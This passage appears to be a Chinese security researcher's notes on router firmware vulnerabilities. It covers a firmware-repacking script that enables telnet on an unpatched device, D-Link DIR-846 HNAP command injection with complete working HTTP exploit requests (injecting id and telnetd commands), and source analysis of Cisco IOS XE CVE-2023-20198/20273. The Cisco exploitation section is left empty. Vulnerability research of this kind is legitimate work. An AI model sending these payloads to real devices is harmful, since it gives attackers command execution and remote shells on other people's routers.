fixed_header = tmp_header[:0x30] + b"\x00" * 0x10 + bytes.fromhex(tmp) + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

tmp2 = hashlib.md5(fixed_header).hexdigest()
fixed_header = tmp_header[:0x30] + bytes.fromhex(tmp2) + bytes.fromhex(tmp) + b"\x00\x00\x00\x88" + b"\x00\x00\x00\x80" + b"\x00\x9a\x01\x88" + b"\x31\x2e\x34\x2e" + tmp_header[0x60:0x84] + b"\x01\xea\xea\x3a" + tmp_header[0x84:]

f = open("./target/final.img", "wb")
f.write(fixed_header + next_data)
f.close()

os.system("sudo rm -rf ./squashfs-root ./target/target.image")
os.system("rm -rf ./target/kernel_mdu.bin")
os.system("sudo rm -rf ./target/file_system.img")
os.system("rm -rf ./target/padding_file_system.img")
os.system("rm -rf ./target/kernel_pfmwr.img")
os.system("rm -rf ./target/packed.bin")
```

然后上传更新固件，telnet访问即可
目前该固件为官网最新版本，该固件停止更新，暂无修复

## DIR-846

环境搭建

**FrimAE怎么看到输出啊？** 查看日志

发现被导向index.html，hnap 503 报错，这种情况查看日志

```shell
ps | grep http
cat /etc/lighttpd/lighttpd.conf | grep log
touch /error
vi /etc/lighttpd/lighttpd.conf
# 修改日志路径
```

重新启动服务

```shell
kill -9 186 & /usr/sbin/lighttpd -f /etc/lighttpd/lighttpd.conf
```

查看日志输出，发现php未能启动

```shell
find . -name "*php*"
```

启动php服务即可

### 漏洞分析

php服务，找到php函数以后，筛选exec函数

```shell
config system
        option hostname rtkmips
        option timezone ''`id > /tmp/result`''
```



```php
<?php

class SetNTPServerSettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $option = $this->act_val;
        $system_info = read_cfg_info("system");
        $system_info = add_or_update_option_info($system_info, "system", "", "timezone", $option['system_time_timezone']);
        save_cfg_info("system", $system_info);
        exec("/etc/init.d/system  restart");
        $result['SetNTPServerSettingsResult'] = "OK";
        $this->api_response(__CLASS__, $result);
    }
}
```





```php
<?php
set_time_limit(300);

class SetNetworkTomographySettings extends GetMultipleHNAPs
{
    function __construct($act_val)
    {
        parent::__construct($act_val);
    }

    public function actionIndex()
    {
        $result['SetNetworkTomographySettingsResult'] = "FAIL";
        $option = $this->act_val;

        $ping_number_range = array("options" => array("min_range" => 1, "max_range" => 50));
        $ping_size_range = array("options" => array("min_range" => 4, "max_range" => 1472));

        if (!filter_var($option['tomography_ping_number'], FILTER_VALIDATE_INT, $ping_number_range)) {  //校验ping次数范围
            $result["message"] = "ping的次数不合法";
        } elseif (!filter_var($option['tomography_ping_size'], FILTER_VALIDATE_INT, $ping_size_range)) {  //校验ping包大小范围
            $result["message"] = "ping包大小不合法";
        } elseif (!(filter_var($option['tomography_ping_address'], FILTER_VALIDATE_IP)  //校验是否为合法IP或域名
            || check_domain($option['tomography_ping_address']))) {
            $result["message"] = "不是合法的IP或域名";
        } else {
            exec("ping -c " . $option['tomography_ping_number'] . " -s " . $option['tomography_ping_size'] . " '" . $option['tomography_ping_address'] . "' > /tmp/ping.result");
            file_put_contents("/etc/.SetNetworkTomography", json_encode($option));
            $result['SetNetworkTomographySettingsResult'] = "OK";
        }
        $this->api_response(__CLASS__, $result);
    }
}
```





### 利用分析

**管道符是不必要的，闭合是必要的(特殊情况 echo )** 

;有无空格都行



使用SetNTPServerSettings接口往/etc/config/system文件中注入命令

```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNTPServerSettings"
HNAP_AUTH: 8D44532710B3593A73383F4366A6A89D 1700479594806
Content-Length: 99
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700479592337
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=5Pv9fmhD; PrivateKey=29C562F7DA84E8FD829F2125E8C11CFC


{
	"SetNTPServerSettings":{
		"system_time_timezone":"'|`id > /tmp/result`|echo'"
	}
}
```





```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 230
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=LVAxmY29; PrivateKey=BB1FEDF0DF83D8E15348FE7C93037EA3; 

{
    "SetNetworkTomographySettings":{
    "tomography_ping_address":"http://example.com/'&telnetd&echo'1",
    "tomography_ping_number":"1",
    "tomography_ping_size":"4",
    "tomography_ping_timeout":"",
    "tomography_ping_ttl":""
	}
}
```







```http
POST /HNAP1/ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
SOAPACTION: "http://purenetworks.com/HNAP1/SetNetworkTomographySettings"
Content-Length: 260
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/Home.html?t=1700472754954
Cookie: PHPSESSID=e9920db8aee2f5b998590af3e5eb20d3; uid=ye2PVqI8; PrivateKey=CCEB89E7E0DAB212E9FEB4A4695A017E

{
    "SetIpMacBindSettings":{
    "lan_unit":"0"
    "lan(0)_dhcps_staticlist":"1,$(id>rce_confirmed),02:42:d6:f9:dc:4e,192.168.0.15"
}
```





## 3.CVE-2023-20198 & CVE-2023-20273  Cisco IOS XE
### 漏洞描述
CVE-2023-20198，CVE-2023-20273

思科正在针对 Cisco IOS XE 软件中观察到的 Web UI 功能利用情况进行持续调查，提供最新信息。我们正在更新修复版本列表并添加软件检查器。我们的调查确定，攻击者利用了两个以前未知的问题。攻击者首先利用 CVE-2023-20198 获得初始访问权限，并发出特权 15 命令来创建本地用户和密码组合。这允许用户以普通用户访问权限登录。然后，攻击者利用 Web UI 功能的另一个组件，利用新的本地用户将权限提升为 root 并将植入程序写入文件系统。Cisco 已为此问题分配了 CVE-2023-20273。CVE-2023-20198 的 CVSS 评分为 10.0。CVE-2023-20273 的 CVSS 评分为 7.2。CSCwh87343 正在跟踪这两个 CVE。
### 影响范围及版本
Cisco IOS XE软件版本系列（启用了 Web UI 功能）：
17.9
17.6
17.3
16.12（仅限 Catalyst 3650 和 3850）
### 漏洞分析

固件下载：

文件系统分析：
var里有web界面的所有内容，

ODM里面有很多功能的文件
这是一个ODM（Object Data Model）文件，用于描述特定设备或系统的数据模型和命令规范。ODM文件通常用于管理和配置网络设备，特别是在Cisco设备中很常见。

主要定义了show running-config aaa命令

```xml
###
show running-config aaa attribute
<?xml version='1.0' encoding='utf-8'?>
<ODMSpec>
<Command>
<Name>show running-config aaa</Name>
</Command>
<OS>ios</OS>
<DataModel>
<Container name="ShowRunningconfigAaa">
<Container name="wnwebdata">
<Container name="aaa attribute list" alias = "entry" dynamic = "true">
<Property name="aaa attribute list" alias="attrlistname" distance = "1" length = "1" type = "String"/>
<Container name="attribute type" alias="attributetype" dynamic="true">
<Property name="attribute type" distance = "1" length = "-1" type = "String"/>
</Container>
</Container>
</Container>
</Container>
</DataModel>
</ODMSpec>

<!--
Copyright (c) 2014-2017 by Cisco Systems, Inc.
All rights reserved.
-->
```





先用binwalk解压，然后卡住了(后来判断是无法解压pkg)，提取出了一部分文件系统，但是在文件系统里没找到web界面部分和lua文件，发现还有一个800M的二进制文件没有解压。将其提取到win下用7zip打开

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206200855.png)
得到一堆pkg包，打开每个pkg里边都有一个img，这里有一个名叫mono的与众不同，点开发现一个新的文件系统，比刚才的更加健全。于是提取到linux里进行分析，果然搜到了lua和web界面。

由于固件是x86架构，还需要启动nginx服务暂时不太好起
```shell
➜  squashfs-root-0 file ./bin/cat
./bin/cat: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d4732ffc359a8578f17bc1888da8132bc1f958c0, stripped
```

分析固件，漏洞点主要是在/var/scripts/lua/features/utils.lua
```lua
function utils.isIpv6Address(ip)
	if utils.isNilOrEmptyString(ip) then
                 return false
        end
        local chunks = utils.splitString(ip,":")
        if #chunks > 8 or #chunks < 3 then
                return false
        end
        for i=1,#chunks do
                if chunks[i] ~="" and chunks[i]:match("([a-fA-F0-9]*)") == nil and tonumber(chunks[i],16) <= 65535 then
                        return false
                end
        end
        return true
end
```

这个函数中的分析如下，其中`chunks[i]:match("([a-fA-F0-9]*)")`去匹配16进制数字出现0次或多次，而不是对字段进行完整校验，因此可以实现拼接，比如
```
abc;id;:ab   ->输出   abcd    ab
```

```lua
function utils.isIpv6Address(ip)
    -- 检查输入是否为 nil 或者是空字符串
    if utils.isNilOrEmptyString(ip) then
        return false
    end
    
    -- 使用 ":" 分割 IPv6 地址为多个块
    local chunks = utils.splitString(ip, ":")
    
    -- 检查 IPv6 地址块的数量是否在有效范围内
    if #chunks > 8 or #chunks < 3 then
        return false
    end
    
    -- 遍历每个 IPv6 地址块
    for i = 1, #chunks do
        -- 检查当前块是否为非空字符串且不匹配十六进制数字
        -- 且其转换为十进制后是否小于等于 65535
        if chunks[i] ~= "" and chunks[i]:match("([a-fA-F0-9]*)") == nil and tonumber(chunks[i], 16) <= 65535 then
            return false
        end
    end
    
    -- 如果所有检查通过，说明是有效的 IPv6 地址
    return true
end

```

而引用这一点的有多处，其中/var/scripts/lua/services/validationModule.lua中validateIPv4IPV6HostNameAddress函数就有这个引用

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206203233.png)

```lua
-- IPV6 Address validation
-- IPV4 Address validation
-- Hostname validation
function validationModule.validateIPv4IPV6HostNameAddress(ip)
    if utils.isNilOrEmptyString(ip) then
        return false
    end

    local validation = utils.isIpv4Address(ip) or utils.isIpv6Address(ip) or validationModule.validateFullyQualifiedHostName(ip)
    if not validation then
        utils.setNginxStatus(ngx.HTTP_BAD_REQUEST,"Invalid request data")
    end
    return validation
end
```

而该函数被/var/scripts/lua/features/snortcheck.lua里调用

```lua
local function validateSnortRequest(req)
	if not utils.isNilOrEmptyString(req.ipaddress) then
		validator.validateIPv4IPV6HostNameAddress(req.ipaddress)
	end
	if not utils.isNilOrEmptyString(req.filePath) then
		validateFilePath(req.filePath)
	end
	if not utils.isNilOrEmptyString(req.destFilename) then
		validateFilePath(req.destFilename)
	end

	......
```

当source == "local"时，就会传入snortTable["ipaddress"]给ipaddress，最终拼接到url给utils.runPexecCommand执行

```lua
local function installSnort(snortTable)
    local cli =""
	local source=snortTable["source"]
	local mode=snortTable["mode"]
	local vsName=snortTable["virtualServiceName"]
	if not utils.isNilOrEmptyString(snortTable["filename"]) then
		validateFilePath(snortTable["filename"])
	end
	if not utils.isNilOrEmptyString(vsName) then
		validator.validate(validator.validateSpecialCharacters, true, vsName)
	end
	if not utils.isNilOrEmptyString(source) then
		validator.validate(validator.validateSpecialCharacters, true, source)
	end
	if source == "device" and mode == "install" then
		local packagePath=snortTable["filename"]
		packagePath = string.gsub(packagePath,"/",":")
		cli = cli.."virtual-service install name".." "..vsName.." package "..packagePath
		--cli = cli.."exit".."\n"
		return cli
	elseif source == "device" and mode == "upgrade" then
		local packagePath=snortTable["filename"]
		packagePath = string.gsub(packagePath,"/",":")
		cli = cli.."virtual-service upgrade name".." "..vsName.." package "..packagePath
		--cli = cli.."exit".."\n"
		return cli
	elseif source == "local" then
		validateSnortRequest(snortTable)
		local copymode = snortTable["copymode"]
		local ipaddress = snortTable["ipaddress"]
		local filePath = snortTable["filePath"]
		local destination = snortTable["destination"]
		local destFilename = snortTable["destFilename"]
		if (destFilename == "" or destFilename == nil) then
			if string.find(filePath, "/") ~= nil then
				local path = utils.splitString(filePath, "/")
				destFilename = path[#path]
			else
				destFilename = filePath
			end
		end
		local url
		if copymode == "ftp" then
			local ftpUsername = snortTable["ftpUsername"]
			local ftpPassword = utils.base64decode(snortTable["ftpPassword"])
			url = "ftp://"..ftpUsername..":"..ftpPassword.."@"..ipaddress.."/"..filePath
		elseif copymode == "sftp" then
			local sftpUsername = snortTable["ftpUsername"]
			local sftpPassword = utils.base64decode(snortTable["ftpPassword"])
			url = "sftp://" .. sftpUsername .. ":" .. sftpPassword .. "@" .. ipaddress.. "/" .. filePath
		else
			url = "tftp://"..ipaddress.."/"..filePath
		end
		local destinationFile = destination..destFilename
		utils.runPexecCommand("setsid",{cleanup_script,"copyova",url,escapeReservedChars(destinationFile),"&"})
		return true
	end
end
```

然后是softwareMgmt.lua，也是同样的原理，其中的validateSmuRequest函数校验了IPV6
```lua
......
elseif method == "POST" then
    local inp = {}
    local req_body = ngx.var.request_body
    if not utils.isNilOrEmptyString(req_body) then
        inp = cjson.decode(req_body)
    end
    local installParams = {}
    if not getInstallInProgress() then
        if lastTag == "installAdd" then
            validateSmuRequest(inp)
            local url, destinationFile = generateUrlAndDestination(inp)
            writeInstallOperationType(inp.operation_type)
            installParams.operation = "install_add"
            installParams.filename = destinationFile
            writeSmuInstallParams(installParams)
            local mode = inp.mode
            -- Install involved file download, which might take long, so it will run in the background.
            utils.runPexecCommand("setsid", {smu_install_script, "--operation", "install_add", "--operation_type", inp.operation_type, "--install_method", mode, "--remote_path", url, "--file_path", destinationFile, "&"})
            ngx.exit(ngx.HTTP_OK)
            .......
```

同目录下的softwareUpgrade.lua，validateUpgradeRequest对IPV6做了校验

```lua
elseif method == "POST" then
    -- Variable declarations and assignment to defaults
    local inp
    local isIESwitch = false
    local url
    local post_request_body = ngx.var.request_body
    if post_request_body ~= nil then
        inp = cjson.decode(post_request_body)
        isIESwitch = inp.isIESwitch
        validator.checkForQuotesAndSpaces(inp)
        validateUpgradeRequest(inp)
        url = generateUrl(inp)
        url = softwareUpgradeUtils.escapeReservedChars(url)
    end
    -- Check for ISSU Abort first as it is allowed to run in parallel, and then for rest of the urls
    if lastTag == "installAbortIssu" then
        if not softwareUpgradeUtils.getIssuAbortStatus() then
            -- Save the config before ISSU Abort start
            softwareUpgradeUtils.saveConfig()

            local issuOperationStartMessage = "\nStarting ISSU Install Abort Operation...\n"
            utils.saveFile(webui_issu_abort_log_file, issuOperationStartMessage)
            utils.runPexecCommand("setsid", {cleanup_script, "install_abort_issu", "&"})
            ngx.exit(ngx.HTTP_OK)
        end
```

以上就是CVE-2023-20273授权命令注入的漏洞点

由于没有新版的固件，从参考文章里截了张修复后的图，可以看到改动还是很大的，先对整体做了匹配，在对单做了匹配，这样就不能有额外的特殊字符了

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231206204928.png)

然后是CVE-2023-20198

部分lua的命令执行会传递给

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207112214.png)

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207112254.png)



```lua
local function WSMASendCommand(ConfigureCliString)
	ngx.header.content_type = "application/json"
	local result = ngx.location.capture("/lua5", {method=ngx.HTTP_POST, body=ConfigureCliString});

	-- Result body commented to avoid spamming, and avoid printing sensitive data in log files.
	-- Enable this to print result body. Development purposes only.
	-- ngx.log(ngx.DEBUG,"Result:",result.body)
	local response = result.body
	if not (response == nil or #response == 0) then
			response = string.gsub(response, "Load for[^\r\n]+[\r]?\n", "")
			response = string.gsub(response, "No time source[^\r\n]+[\r]?\n", "")
			response = string.gsub(response, "Time source is[^\r\n]+[\r]?\n", "")
	end
	return response
end
```

tips：WSMA（Web Services Management Agent）是一种用于网络设备管理的协议和框架。WSMA基于标准的Web服务技术，如SOAP（Simple Object Access Protocol）和WSDL（Web Services Description Language）。总体而言，WSMA是一种用于简化网络设备管理的技术，通过使用标准的Web服务接口，使网络管理员能够更轻松地配置和监控网络设备。

搜索lua5可以快速找到配置文件/usr/binos/conf/webui.conf

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231207113307.png)








### 利用分析




https://cn-sec.com/archives/2137805.html

https://software.cisco.com/download/home/286321991/type/282046477/release/Cupertino-17.9.1a

https://www.iotsec-zone.com/article/428#2-cve-2023-20273

https://mp.weixin.qq.com/s?__biz=MzUxMDQzNTMyNg==&mid=2247503270&idx=2&sn=61497b460a90089563a5001085f09001&chksm=f9018737ce760e216ca69f6ea70860f9ff357ec010422ba14d68784c3e4e15184bea1c21a9fd&scene=126&sessionid=1698035720&key=094fe642087a4fbe0928fdde94bb3603af6462496d666cf2e7abbae31127be0a5804b29c25762ccd9fef7760fb7a9a237c748c5945f9cf5f07d4877857553cb015e73b63c060b887efc07d8d46c73ed5f51050e70722f55861416ebb596d20ba152dfbe4c8a6c645800bbebb755da9e5c3fbfd229727204ed8403ab65cbd3237&ascene=15&uin=NTY2NTA4NjQ%3D&devicetype=Windows+10+x64&version=63060012&lang=zh_CN&session_us=gh_cf325e4d8d77&countrycode=AL&exportkey=n_ChQIAhIQK0KNUd7KPPHb2w%2FHofaJYBLuAQIE97dBBAEAAAAAAHt7NO8XrCAAAAAOpnltbLcz9gKNyK89dVj0D3Uhh4RMzy8VCRitK%2BrnFnj2vAB%2FTVVNcfQ48o7jQirs9Bzx6Oi7LV3vs0tD5n1StvJLLZMomjQ6tCwfD6DU9wlZ0IQblksQlWpkbpTa7OVXwmxY9yNMvVKRu1Xt9InKeZihK%2FG0FxX2CeFe%2F8PS712sH2x%2Fp3csTq0KWhsUR4h2wxW8M4YfEdwRusXYh9KaVff2gASbT9uRz33MHM0ijg7yRNJYc6emlM0NmBupTvyXY1qdE2ctJvAoywUvtf8LnghuKIDhcWc%3D&acctmode=0&pass_ticket=7e3wURkJn2bxcyZw2ErX22DMhrAsmBcSyBvL6Mq%2Bx5aKZXwKSsRkiTnMBm%2F1%2Fbk2&wx_header=0&fontgear=2



https://download.csdn.net/download/weixin_41604634/20627527?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EOPENSEARCH%7EPaid-1-20627527-blog-110419492.235%5Ev39%5Epc_relevant_3m_sort_dl_base3&depth_1-utm_source=distribute.pc_relevant_t0.none-task-download-2%7Edefault%7EOPENSEARCH%7EPaid-1-20627527-blog-110419492.235%5Ev39%5Epc_relevant_3m_sort_dl_base3&utm_relevant_index=1



## 2022 QWB RDP










